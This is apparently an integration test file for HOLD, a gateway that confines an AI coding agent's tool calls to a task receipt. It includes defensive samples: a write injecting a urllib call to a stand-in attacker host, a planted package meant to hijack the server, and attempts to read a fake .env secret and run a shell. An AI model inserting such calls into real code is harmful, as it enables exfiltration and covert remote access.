"""
Integration tests for hold/server.py over real stdio, using the MCP SDK's own client
(`stdio_client` + `ClientSession`, mcp 1.29.0).

Each test starts `python -m hold.server` as a subprocess with the command and environment
that scripts/make_mcp_config.py writes for Claude Code, inside a temporary workspace with a
temporary receipt and audit log (both outside the workspace). A local http.server on
127.0.0.1 counts requests, so a DENY can be shown to have dispatched nothing.

CLICKHOUSE_HOST is set to "" for every server started here: `load_env()` never overrides a
variable that is already set, so the repo's .env cannot turn ClickHouse writes on during
tests. Events go only to the temporary JSONL file.
"""

from __future__ import annotations

import http.server
import importlib.util
import inspect
import json
import logging
import os
import queue
import subprocess
import sys
import tempfile
import threading
import unittest
from datetime import timedelta
from pathlib import Path
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple
from unittest import mock

import anyio
from mcp import ClientSession, StdioServerParameters, stdio_client

from hold.core import ClickHouseWriter, IntentReceipt, JsonlWriter
from hold.server import build_gateway

REPO = Path(__file__).resolve().parent.parent
PY = sys.executable
HOLD_TOOLS = {"read_file", "write_file", "fetch_url", "list_files", "search_code", "read_lines", "edit_file"}
SESSION_TIMEOUT = 60  # seconds for one whole client session, including startup and shutdown
LINE_TIMEOUT = 30     # seconds to wait for any single raw JSON-RPC response

BUGGY_APP = "def get_user_name(user):\n    return user.name.upper()\n"
FIXED_APP = 'def get_user_name(user):\n    if user is None:\n        return ""\n    return user.name.upper()\n'
FAKE_DOTENV = "FAKE_TOKEN=not-a-real-secret\n"
FETCH_BODY = b"print('reproduction script')\n"
TEMPLATE_RECEIPT = {  # SPEC.md 2, with the workspace left for make_mcp_config to render
    "task_id": "hold-demo-001",
    "intent": "Fix NoneType crash in src/flask/app.py",
    "workspace_root": "<HOLD_DEMO_WORKSPACE>",
    "capabilities": {
        "read": ["src/**", "tests/**", "pyproject.toml", "ISSUE.md"],
        "write": ["src/flask/app.py"],
        "protected": [],
        "network_egress": False,
        "host_allowlist": [],
        "shell_execution": False,
        "git_push": False,
    },
}


def _load_script(name: str):
    spec = importlib.util.spec_from_file_location(f"_hold_script_{name}", REPO / "scripts" / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


MAKE_CONFIG = _load_script("make_mcp_config")


# ---------------------------------------------------------------------------- fixtures

class CountingServer:
    """Local HTTP server that only counts GETs. It is the 'attacker' endpoint."""

    def __init__(self):
        counter = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                counter.hits += 1
                self.send_response(200)
                self.send_header("Content-Length", str(len(FETCH_BODY)))
                self.end_headers()
                self.wfile.write(FETCH_BODY)

            def log_message(self, *args):
                pass

        self.hits = 0
        self.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.httpd.server_address[1]}/reproduce_issue.py"

    def close(self):
        self.httpd.shutdown()
        self.httpd.server_close()


class Workspace:
    """temp/workspace (agent-visible) + temp/configs/receipt.json + temp/audit.jsonl."""

    def __init__(self, base: Path, **capabilities: Any):
        self.base = base
        self.ws = base / "workspace"
        (self.ws / "src" / "flask").mkdir(parents=True)
        self.app = self.ws / "src" / "flask" / "app.py"
        self.app.write_bytes(BUGGY_APP.encode("utf-8"))
        (self.ws / ".env").write_text(FAKE_DOTENV, encoding="utf-8")
        (self.ws / "ISSUE.md").write_text("get_user_name crashes on None.\n", encoding="utf-8")
        (base / "configs").mkdir()
        self.receipt = base / "configs" / "receipt.json"
        caps = {"read": ["src/**", "tests/**", "ISSUE.md"], "write": ["src/flask/app.py"],
                "network_egress": False, "host_allowlist": []}
        caps.update(capabilities)
        self.receipt.write_text(json.dumps({
            "task_id": "hold-test-001", "intent": "Fix NoneType crash in src/flask/app.py",
            "workspace_root": "../workspace", "capabilities": caps}), encoding="utf-8")
        self.audit = base / "audit.jsonl"
        self.stderr_log = base / "server.stderr.log"

    def server_env(self, receipt: Optional[Path] = None, **overrides: str) -> Dict[str, str]:
        """Exactly the env block make_mcp_config writes, plus test-only overrides."""
        entry = MAKE_CONFIG.server_entry(receipt or self.receipt, self.audit, python=Path(PY))
        env = dict(entry["env"])
        env.update({"CLICKHOUSE_HOST": "", "HOLD_AGENT_ID": "test-agent"})
        env.update(overrides)
        return env

    def params(self, receipt: Optional[Path] = None) -> StdioServerParameters:
        entry = MAKE_CONFIG.server_entry(receipt or self.receipt, self.audit, python=Path(PY))
        return StdioServerParameters(command=entry["command"], args=entry["args"],
                                     env=self.server_env(receipt), cwd=str(self.ws))

    def audit_rows(self) -> List[Dict[str, Any]]:
        if not self.audit.exists():
            return []
        return [json.loads(line) for line in self.audit.read_text(encoding="utf-8").splitlines() if line]


def full_env(env: Dict[str, str]) -> Dict[str, str]:
    """os.environ without any HOLD_* settings of the developer, plus `env`."""
    base = {k: v for k, v in os.environ.items() if not k.startswith("HOLD_")}
    base.update(env)
    return base


def run_client(ws: Workspace, scenario: Callable[[ClientSession], Awaitable[Any]],
               receipt: Optional[Path] = None) -> Tuple[Any, str]:
    """Start the server, initialize, run `scenario`, shut down. Returns (result, stderr)."""

    async def main():
        with anyio.fail_after(SESSION_TIMEOUT):
            with ws.stderr_log.open("w", encoding="utf-8") as errlog:
                async with stdio_client(ws.params(receipt), errlog=errlog) as (read, write):
                    async with ClientSession(read, write, read_timeout_seconds=timedelta(seconds=LINE_TIMEOUT)) as session:
                        init = await session.initialize()
                        assert init.serverInfo.name == "hold", init.serverInfo
                        return await scenario(session)

    # The SDK client logs a warning when asked to call a tool the server did not list.
    client_log = logging.getLogger("mcp.client.session")
    level = client_log.level
    client_log.setLevel(logging.ERROR)
    try:
        result = anyio.run(main)
    finally:
        client_log.setLevel(level)
    return result, ws.stderr_log.read_text(encoding="utf-8", errors="replace")


def text_of(result) -> str:
    return "".join(getattr(block, "text", "") for block in result.content)


class RawServer:
    """The server as a plain subprocess, for checking every byte it writes to stdout."""

    def __init__(self, argv: List[str], env: Dict[str, str], cwd: Path):
        self.proc = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, cwd=str(cwd), env=full_env(env))
        self.lines: "queue.Queue[Optional[bytes]]" = queue.Queue()
        self.stdout: List[bytes] = []
        self.stderr = b""
        threading.Thread(target=self._read_stdout, daemon=True).start()
        self._err = threading.Thread(target=self._read_stderr, daemon=True)
        self._err.start()

    def _read_stdout(self):
        for line in self.proc.stdout:
            self.lines.put(line)
        self.lines.put(None)

    def _read_stderr(self):
        self.stderr = self.proc.stderr.read()

    def send(self, message: Dict[str, Any]) -> None:
        self.proc.stdin.write(json.dumps(message).encode("utf-8") + b"\n")
        self.proc.stdin.flush()

    def response(self, request_id: int) -> Dict[str, Any]:
        while True:
            line = self.lines.get(timeout=LINE_TIMEOUT)
            if line is None:
                raise AssertionError(f"server closed stdout before answering id {request_id}")
            self.stdout.append(line)
            message = json.loads(line)  # every stdout line must be a JSON-RPC message
            if message.get("id") == request_id:
                return message

    def close(self) -> int:
        self.proc.stdin.close()
        try:
            code = self.proc.wait(timeout=LINE_TIMEOUT)
        except subprocess.TimeoutExpired:
            self.proc.kill()
            raise
        while True:  # drain anything written after the last awaited response
            line = self.lines.get(timeout=LINE_TIMEOUT)
            if line is None:
                break
            self.stdout.append(line)
        self._err.join(LINE_TIMEOUT)
        self.dispose()
        return code

    def dispose(self) -> None:
        if self.proc.poll() is None:
            self.proc.kill()
            self.proc.wait(LINE_TIMEOUT)
        for pipe in (self.proc.stdin, self.proc.stdout, self.proc.stderr):
            try:
                pipe.close()
            except OSError:
                pass


INITIALIZE = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {
    "protocolVersion": "2025-06-18", "capabilities": {},
    "clientInfo": {"name": "hold-raw-test", "version": "0"}}}
INITIALIZED = {"jsonrpc": "2.0", "method": "notifications/initialized"}


def tools_call(request_id: int, name: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
    return {"jsonrpc": "2.0", "id": request_id, "method": "tools/call",
            "params": {"name": name, "arguments": arguments}}


# ------------------------------------------------------------------------------- tests

class StdioIntegrationTest(unittest.TestCase):
    """The real server over stdio with the SDK client: list, allow, deny, audit."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.ws = Workspace(Path(self._tmp.name))
        self.http = CountingServer()
        self.addCleanup(self.http.close)

    def test_tools_allow_deny_and_audit_over_stdio(self):
        ws, url = self.ws, self.http.url

        async def scenario(session: ClientSession) -> Dict[str, Any]:
            out: Dict[str, Any] = {"tools": (await session.list_tools()).tools}
            out["read"] = await session.call_tool("read_file", {"path": "src/flask/app.py"})
            out["write"] = await session.call_tool("write_file", {"path": "src/flask/app.py", "content": FIXED_APP})
            out["disk_after_write"] = ws.app.read_bytes()
            out["fetch"] = await session.call_tool("fetch_url", {"url": url})
            out["hits_after_fetch"] = self.http.hits
            out["env"] = await session.call_tool("read_file", {"path": ".env"})
            out["shell"] = await session.call_tool("bash_exec", {"command": "id"})
            out["extra_arg"] = await session.call_tool("read_file", {"path": "ISSUE.md", "mode": "rb"})
            return out

        out, stderr = run_client(ws, scenario)

        # tools/list: exactly the seven tools, with exact argument schemas.
        tools = {t.name: t for t in out["tools"]}
        self.assertEqual(set(tools), HOLD_TOOLS)
        self.assertEqual(set(tools["read_file"].inputSchema["properties"]), {"path"})
        self.assertEqual(set(tools["write_file"].inputSchema["properties"]), {"path", "content"})
        self.assertEqual(set(tools["fetch_url"].inputSchema["properties"]), {"url"})
        for tool in tools.values():
            self.assertIn("approved for", tool.description)
        self.assertIn("workspace-relative", tools["read_file"].description)
        self.assertIn("workspace-relative", tools["write_file"].description)

        # Allowed read and write.
        self.assertFalse(out["read"].isError, text_of(out["read"]))
        self.assertEqual(text_of(out["read"]), BUGGY_APP)
        self.assertFalse(out["write"].isError, text_of(out["write"]))
        self.assertEqual(out["disk_after_write"], FIXED_APP.encode("utf-8"))

        # Denials are tool results with isError and HOLD's reason, and nothing dispatched.
        self.assertTrue(out["fetch"].isError)
        self.assertEqual(text_of(out["fetch"]),
                         "HOLD denied fetch_url: network egress not granted by the receipt (host '127.0.0.1')")
        self.assertEqual(out["hits_after_fetch"], 0)
        self.assertEqual(self.http.hits, 0)
        self.assertTrue(out["env"].isError)
        self.assertEqual(text_of(out["env"]), "HOLD denied read_file: protected resource '.env'")
        self.assertTrue(out["shell"].isError)
        self.assertIn("HOLD denied bash_exec: tool 'bash_exec' is not offered by HOLD", text_of(out["shell"]))
        self.assertTrue(out["extra_arg"].isError)
        self.assertIn("arguments do not match the read_file schema", text_of(out["extra_arg"]))

        # Startup and graceful shutdown were logged on stderr (shutdown = telemetry flushed).
        digest = IntentReceipt.load(ws.receipt).digest
        self.assertIn(f"digest={digest[:16]}", stderr)
        self.assertIn("telemetry writers: JsonlWriter", stderr)
        self.assertNotIn("ClickHouseWriter", stderr)
        self.assertIn("stopped; telemetry flushed (dropped=0, writer_errors={})", stderr)

        # Audit JSONL: one row per call, in order, with the decision and exec_status.
        rows = ws.audit_rows()
        got = [(r["tool_name"], r["sink"], r["target"], r["decision"], r["exec_status"]) for r in rows]
        self.assertEqual(got, [
            ("read_file", "FS_READ", "src/flask/app.py", "ALLOW", "ok"),
            ("write_file", "FS_WRITE", "src/flask/app.py", "ALLOW", "ok"),
            ("fetch_url", "NETWORK_EGRESS", "http://127.0.0.1", "DENY", "not_run"),
            ("read_file", "FS_READ", ".env", "DENY", "not_run"),
            ("bash_exec", "SHELL_EXEC", "bash_exec", "DENY", "not_run"),
            ("read_file", "FS_READ", "", "DENY", "not_run"),
        ])
        for r in rows:
            self.assertEqual((r["task_id"], r["agent_id"], r["intent_digest"]), ("hold-test-001", "test-agent", digest))
        request_ids = [r["request_id"] for r in rows]
        self.assertTrue(all(request_ids), request_ids)
        self.assertEqual(len(set(request_ids)), len(request_ids))
        audit_text = ws.audit.read_text(encoding="utf-8")
        for leaked in ("not-a-real-secret", "reproduce_issue.py", "if user is None"):
            self.assertNotIn(leaked, audit_text)

    def test_positive_control_allow_host_dispatches_exactly_once(self):
        """Same fetch, receipt that grants 127.0.0.1: ALLOW and one request at the server.
        Shows the DENY above came from the receipt, not from a missing network tool."""
        allow = MAKE_CONFIG.render_receipt(self.ws.receipt, self.ws.base / "generated", allow_host="127.0.0.1")
        url = self.http.url

        async def scenario(session: ClientSession):
            return await session.call_tool("fetch_url", {"url": url})

        result, _ = run_client(self.ws, scenario, receipt=allow)
        self.assertFalse(result.isError, text_of(result))
        self.assertEqual(text_of(result), FETCH_BODY.decode("utf-8"))
        self.assertEqual(self.http.hits, 1)
        rows = self.ws.audit_rows()
        self.assertEqual([(r["tool_name"], r["target"], r["decision"], r["exec_status"]) for r in rows],
                         [("fetch_url", "http://127.0.0.1", "ALLOW", "ok")])
        self.assertEqual(rows[0]["intent_digest"], IntentReceipt.load(allow).digest)
        self.assertNotEqual(rows[0]["intent_digest"], IntentReceipt.load(self.ws.receipt).digest)


class StdoutDisciplineTest(unittest.TestCase):
    """stdout is the protocol channel: every byte on it must be JSON-RPC."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.ws = Workspace(Path(self._tmp.name))
        self.http = CountingServer()
        self.addCleanup(self.http.close)

    def _exchange(self, argv: List[str]) -> Tuple[RawServer, Dict[int, Dict[str, Any]], int]:
        server = RawServer(argv, self.ws.server_env(), self.ws.ws)
        self.addCleanup(server.dispose)
        responses = {}
        server.send(INITIALIZE)
        responses[1] = server.response(1)
        server.send(INITIALIZED)
        server.send({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
        responses[2] = server.response(2)
        server.send(tools_call(3, "read_file", {"path": "ISSUE.md"}))
        responses[3] = server.response(3)
        server.send(tools_call(4, "fetch_url", {"url": self.http.url}))
        responses[4] = server.response(4)
        code = server.close()
        return server, responses, code

    def _assert_only_jsonrpc(self, server: RawServer) -> None:
        self.assertTrue(server.stdout)
        for line in server.stdout:
            message = json.loads(line)
            self.assertEqual(message.get("jsonrpc"), "2.0", line)

    def test_python_m_hold_server_writes_only_jsonrpc_to_stdout(self):
        server, responses, code = self._exchange([PY, "-m", "hold.server"])
        self.assertEqual(code, 0, server.stderr.decode("utf-8", "replace"))
        self._assert_only_jsonrpc(server)
        self.assertEqual(len(server.stdout), 4)  # one line per response, nothing else
        self.assertEqual(responses[1]["result"]["serverInfo"]["name"], "hold")
        self.assertEqual({t["name"] for t in responses[2]["result"]["tools"]},
                         HOLD_TOOLS)
        self.assertFalse(responses[3]["result"]["isError"])
        self.assertTrue(responses[4]["result"]["isError"])
        self.assertIn("HOLD denied fetch_url", responses[4]["result"]["content"][0]["text"])
        self.assertNotIn("error", responses[4])  # a tool result, not a JSON-RPC error
        self.assertEqual(self.http.hits, 0)
        self.assertIn(b"[hold] task=hold-test-001", server.stderr)

    def test_stray_print_in_server_process_goes_to_stderr(self):
        """Patch the gateway and the .env loader to print(); the protocol stays clean."""
        launcher = (
            "import sys, hold.core as core, hold.server as server\n"
            "call, load = core.Gateway.call, server.load_env\n"
            "def noisy_call(self, *a, **k):\n"
            "    print('STRAY-PRINT-FROM-TOOL-CODE')\n"
            "    return call(self, *a, **k)\n"
            "def noisy_load(*a, **k):\n"
            "    print('STRAY-PRINT-AT-STARTUP')\n"
            "    return load(*a, **k)\n"
            "core.Gateway.call, server.load_env = noisy_call, noisy_load\n"
            "sys.exit(server.main())\n"
        )
        server, responses, code = self._exchange([PY, "-c", launcher])
        self.assertEqual(code, 0, server.stderr.decode("utf-8", "replace"))
        self._assert_only_jsonrpc(server)
        self.assertEqual(len(server.stdout), 4)
        self.assertIn(b"STRAY-PRINT-AT-STARTUP", server.stderr)
        self.assertEqual(server.stderr.count(b"STRAY-PRINT-FROM-TOOL-CODE"), 2)


class StartupTest(unittest.TestCase):
    """Bad configuration: exit non-zero before serving, error on stderr, nothing on stdout."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.ws = Workspace(Path(self._tmp.name))

    def _start(self, env: Dict[str, str], cwd: Optional[Path] = None) -> subprocess.CompletedProcess:
        return subprocess.run([PY, "-m", "hold.server"], input=json.dumps(INITIALIZE).encode() + b"\n",
                              capture_output=True, cwd=str(cwd or self.ws.ws), env=full_env(env),
                              timeout=LINE_TIMEOUT)

    def test_missing_or_invalid_receipt_fails_before_serving(self):
        bad = self.ws.base / "configs" / "bad.json"
        bad.write_text(json.dumps({"task_id": "t", "intent": "i", "workspace_root": "../workspace",
                                   "capabilities": {"read": ["**"], "exec": True}}), encoding="utf-8")
        cases = {
            "HOLD_RECEIPT is not set": self.ws.server_env(HOLD_RECEIPT=""),
            "HOLD_RECEIPT must be an absolute path": self.ws.server_env(HOLD_RECEIPT="configs/receipt.json"),
            "unknown receipt fields": self.ws.server_env(HOLD_RECEIPT=str(bad)),
        }
        for expected, env in cases.items():
            with self.subTest(expected):
                proc = self._start(env)
                self.assertNotEqual(proc.returncode, 0)
                self.assertEqual(proc.stdout, b"")
                stderr = proc.stderr.decode("utf-8", "replace")
                self.assertIn("[hold] cannot start:", stderr)
                self.assertIn(expected, stderr)
        self.assertFalse(self.ws.audit.exists())

    def test_workspace_cannot_shadow_the_hold_package(self):
        """Claude Code starts the server in the (untrusted) workspace. With the generated
        config's PYTHONSAFEPATH=1, a planted `hold/` package there is not imported."""
        planted = self.ws.ws / "hold"
        planted.mkdir()
        (planted / "__init__.py").write_text("import sys\nsys.stdout.write('HIJACKED\\n')\nsys.exit(97)\n",
                                             encoding="utf-8")
        env = self.ws.server_env()
        self.assertEqual(env["PYTHONSAFEPATH"], "1")
        server = RawServer([PY, "-m", "hold.server"], env, self.ws.ws)
        self.addCleanup(server.dispose)
        server.send(INITIALIZE)
        self.assertEqual(server.response(1)["result"]["serverInfo"]["name"], "hold")
        self.assertEqual(server.close(), 0)
        self.assertNotIn(b"HIJACKED", b"".join(server.stdout))

        # Control: without PYTHONSAFEPATH the planted package does run.
        env.pop("PYTHONSAFEPATH")
        proc = self._start({**env, "PYTHONSAFEPATH": ""})
        self.assertEqual(proc.returncode, 97)
        self.assertIn(b"HIJACKED", proc.stdout)


class BuildGatewayTest(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.ws = Workspace(Path(self._tmp.name))

    def test_writers_follow_clickhouse_configuration(self):
        with mock.patch.dict(os.environ, {"CLICKHOUSE_HOST": ""}):
            gateway, telemetry = build_gateway(self.ws.receipt, self.ws.audit)
        telemetry.close()
        self.assertEqual([type(w) for w in telemetry.writers], [JsonlWriter])
        self.assertEqual(gateway.agent_id, "claude-code")
        # Configured ClickHouse adds the writer; it connects lazily, so nothing is contacted here.
        with mock.patch.dict(os.environ, {"CLICKHOUSE_HOST": "clickhouse.invalid"}):
            _, telemetry = build_gateway(self.ws.receipt, self.ws.audit, agent_id="x")
        telemetry.close()
        self.assertEqual([type(w) for w in telemetry.writers], [JsonlWriter, ClickHouseWriter])
        self.assertIn("write_scanner", inspect.signature(build_gateway).parameters)

    def test_refuses_receipt_or_audit_log_inside_the_workspace(self):
        inside = self.ws.ws / "receipt.json"
        data = json.loads(self.ws.receipt.read_text(encoding="utf-8"))
        data["workspace_root"] = "."
        inside.write_text(json.dumps(data), encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "receipt must live outside"):
            build_gateway(inside, self.ws.audit)
        with self.assertRaisesRegex(ValueError, "audit log must live outside"):
            build_gateway(self.ws.receipt, self.ws.ws / "audit.jsonl")
        with self.assertRaisesRegex(ValueError, "audit log directory does not exist"):
            build_gateway(self.ws.receipt, self.ws.base / "missing" / "audit.jsonl")


class MakeMcpConfigTest(unittest.TestCase):
    """The generator, run as a script, against a temp template and HOLD_DEMO_WORKSPACE."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.ws = Workspace(Path(self._tmp.name))
        self.template = self.ws.base / "configs" / "template.json"
        data = json.loads(self.ws.receipt.read_text(encoding="utf-8"))
        data["workspace_root"] = MAKE_CONFIG.WORKSPACE_PLACEHOLDER
        self.template.write_text(json.dumps(data), encoding="utf-8")
        self.generated = self.ws.base / "generated"
        self.out = self.ws.base / "hold.mcp.json"

    def _run(self, *extra: str, workspace: Optional[Path] = None) -> subprocess.CompletedProcess:
        env = full_env({"HOLD_DEMO_WORKSPACE": str(workspace or self.ws.ws)})
        return subprocess.run([PY, str(REPO / "scripts" / "make_mcp_config.py"), "--receipt", str(self.template),
                               "--generated-dir", str(self.generated), "--audit-log", str(self.ws.audit),
                               "--out", str(self.out), *extra],
                              capture_output=True, text=True, timeout=LINE_TIMEOUT, env=env)

    def test_renders_template_and_writes_absolute_secret_free_config(self):
        proc = self._run()
        self.assertEqual(proc.returncode, 0, proc.stderr)
        entry = json.loads(self.out.read_text(encoding="utf-8"))["mcpServers"]["hold"]
        self.assertEqual(entry["args"], ["-m", "hold.server"])
        self.assertTrue(Path(entry["command"]).is_absolute() and Path(entry["command"]).is_file())
        self.assertEqual(set(entry["env"]), {"PYTHONPATH", "PYTHONSAFEPATH", "HOLD_RECEIPT", "HOLD_AUDIT_LOG"})
        self.assertEqual(Path(entry["env"]["PYTHONPATH"]), REPO)
        self.assertEqual(Path(entry["env"]["HOLD_AUDIT_LOG"]), self.ws.audit.resolve())
        rendered = Path(entry["env"]["HOLD_RECEIPT"])
        self.assertEqual(rendered, (self.generated / "template.json").resolve())
        data = json.loads(rendered.read_text(encoding="utf-8"))
        self.assertEqual(data["workspace_root"], str(self.ws.ws.absolute()))
        receipt = IntentReceipt.load(rendered)
        self.assertEqual(receipt.workspace_root, self.ws.ws.resolve())
        self.assertIn(f"digest={receipt.digest[:16]}", proc.stdout)
        self.assertIn(f"workspace {receipt.workspace_root}", proc.stdout)
        self.assertIn("--tools '' --strict-mcp-config --mcp-config", proc.stdout)
        self.assertIn("--allowedTools mcp__hold", proc.stdout)
        template = json.loads(self.template.read_text(encoding="utf-8"))
        self.assertEqual(template["workspace_root"], MAKE_CONFIG.WORKSPACE_PLACEHOLDER)  # template untouched

    def test_allow_host_renders_positive_control_receipt(self):
        proc = self._run("--allow-host", "127.0.0.1")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        entry = json.loads(self.out.read_text(encoding="utf-8"))["mcpServers"]["hold"]
        allow = Path(entry["env"]["HOLD_RECEIPT"])
        self.assertEqual(allow, (self.generated / "template.allow-host.json").resolve())
        template, generated = (json.loads(p.read_text(encoding="utf-8")) for p in (self.template, allow))
        self.assertEqual(generated["capabilities"].pop("network_egress"), True)
        self.assertEqual(generated["capabilities"].pop("host_allowlist"), ["127.0.0.1"])
        self.assertEqual(generated.pop("workspace_root"), str(self.ws.ws.absolute()))
        for key in ("network_egress", "host_allowlist"):
            template["capabilities"].pop(key)
        template.pop("workspace_root")
        self.assertEqual(generated, template)  # nothing else differs, task_id included

    def test_rejects_bad_hosts_and_workspaces_without_writing(self):
        missing = self.ws.base / "no-such-workspace"
        cases = [
            (("--allow-host", "https://evil.example/x"), None, "not a bare hostname"),
            ((), REPO / "demo" / "workspace", "outside the HOLD repo"),
            ((), missing, "workspace_root does not exist"),
        ]
        for extra, workspace, expected in cases:
            with self.subTest(expected):
                proc = self._run(*extra, workspace=workspace)
                self.assertEqual(proc.returncode, 2)
                self.assertIn(expected, proc.stderr)
                self.assertFalse(self.out.exists())
                self.assertFalse(self.generated.exists() and any(self.generated.iterdir()))
        self.assertIn("scripts/reset_demo.py", proc.stderr)  # hint for the missing workspace

    def test_refuses_a_linked_workspace(self):
        link = self.ws.base / "linked-workspace"
        try:
            if os.name == "nt":
                import _winapi
                _winapi.CreateJunction(str(self.ws.ws), str(link))
            else:
                link.symlink_to(self.ws.ws, target_is_directory=True)
        except (OSError, ImportError, AttributeError) as exc:
            self.skipTest(f"cannot create a link here: {exc}")
        proc = self._run(workspace=link)
        self.assertEqual(proc.returncode, 2)
        self.assertIn("is a symlink or junction", proc.stderr)
        self.assertFalse(self.out.exists())


class CommittedReceiptTest(unittest.TestCase):
    """configs/intent_receipt*.json are templates: unusable until rendered."""

    def test_templates_match_spec_and_do_not_load(self):
        deny_path = REPO / "configs" / "intent_receipt.json"
        allow_path = REPO / "configs" / "intent_receipt.allow-host.json"
        self.assertEqual(json.loads(deny_path.read_text(encoding="utf-8")), TEMPLATE_RECEIPT)
        expected = json.loads(json.dumps(TEMPLATE_RECEIPT))
        expected["capabilities"].update(network_egress=True, host_allowlist=["replace-with-demo-host.invalid"])
        self.assertEqual(json.loads(allow_path.read_text(encoding="utf-8")), expected)
        for path in (deny_path, allow_path):
            with self.subTest(path.name), self.assertRaises((ValueError, OSError)):
                IntentReceipt.load(path)

    def test_rendered_template_has_absolute_workspace_outside_repo(self):
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp) / "hold-demo-workspace"
            ws.mkdir()
            with mock.patch.dict(os.environ, {"HOLD_DEMO_WORKSPACE": str(ws)}):
                rendered = MAKE_CONFIG.render_receipt(REPO / "configs" / "intent_receipt.json", Path(tmp) / "generated")
            data = json.loads(rendered.read_text(encoding="utf-8"))
            root = Path(data["workspace_root"])
            self.assertTrue(root.is_absolute())
            self.assertEqual(root, ws.absolute())
            self.assertNotIn(REPO.resolve(), [root.resolve(), *root.resolve().parents])
            self.assertEqual(IntentReceipt.load(rendered).workspace_root, ws.resolve())
            self.assertEqual({k: v for k, v in data.items() if k != "workspace_root"},
                             {k: v for k, v in TEMPLATE_RECEIPT.items() if k != "workspace_root"})


class SemgrepWriteScanOverStdioTest(unittest.TestCase):
    """End to end through the real MCP server with REAL Semgrep (added by the orchestrator
    after the integrator was cut off): the scan must actually run on the MCP path."""

    INJECTED = FIXED_APP + "import urllib.request\nurllib.request.urlopen('http://attacker.invalid/x')\n"

    def setUp(self):
        from hold.scan import probe, write_scanner_from_env
        scanner = write_scanner_from_env()
        if scanner is None:
            self.skipTest("HOLD_SEMGREP=0: write scan disabled")
        works, detail = probe(scanner)
        if not works:
            self.skipTest(f"Semgrep cannot scan on this host: {detail}")
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.ws = Workspace(Path(self._tmp.name))
        # Two real scans take 7-18 s each on the dev machine; widen this test's timeouts only.
        module = sys.modules[__name__]
        for name, value in (("SESSION_TIMEOUT", 240), ("LINE_TIMEOUT", 120)):
            patcher = mock.patch.object(module, name, value)
            patcher.start()
            self.addCleanup(patcher.stop)

    def test_injected_network_call_is_denied_and_fix_is_allowed_over_stdio(self):
        ws = self.ws

        async def scenario(session: ClientSession) -> Dict[str, Any]:
            out: Dict[str, Any] = {}
            out["bad"] = await session.call_tool("write_file", {"path": "src/flask/app.py", "content": self.INJECTED})
            out["disk_after_bad"] = ws.app.read_bytes()
            out["good"] = await session.call_tool("write_file", {"path": "src/flask/app.py", "content": FIXED_APP})
            out["disk_after_good"] = ws.app.read_bytes()
            return out

        out, _ = run_client(ws, scenario)

        self.assertTrue(out["bad"].isError, text_of(out["bad"]))
        self.assertIn("HOLD denied write_file", text_of(out["bad"]))
        self.assertIn("hold-net", text_of(out["bad"]))
        self.assertEqual(out["disk_after_bad"], BUGGY_APP.encode("utf-8"), "injected write reached the disk")
        self.assertFalse(out["good"].isError, text_of(out["good"]))
        self.assertEqual(out["disk_after_good"], FIXED_APP.encode("utf-8"))

        rows = [(r["tool_name"], r["decision"], r["exec_status"]) for r in ws.audit_rows()]
        self.assertEqual(rows, [("write_file", "DENY", "not_run"), ("write_file", "ALLOW", "ok")])
        reasons = [r["reason"] for r in ws.audit_rows()]
        self.assertIn("scan", reasons[0])
        self.assertIn("Semgrep: no new findings", reasons[1])
        self.assertNotIn("attacker.invalid", ws.audit.read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
